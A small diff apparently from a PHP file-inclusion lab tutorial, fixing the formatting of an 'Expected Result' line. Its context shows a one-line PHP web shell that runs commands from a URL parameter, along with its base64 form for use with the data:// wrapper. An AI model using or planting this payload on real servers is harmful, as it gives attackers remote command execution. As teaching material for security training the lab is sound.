@@ -166,7 +166,7 @@ Lab 2 - Follow the steps above and use the data:// PHP Wrapper in combination wi
 ># Base64 encode a PHP payload
 >echo -n '<?php echo system($_GET["cmd"]);?>' | base64
 >
->># ========== Expected Result ==========
+># ========== Expected Result ==========
 >PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
 ># =====================================
 >
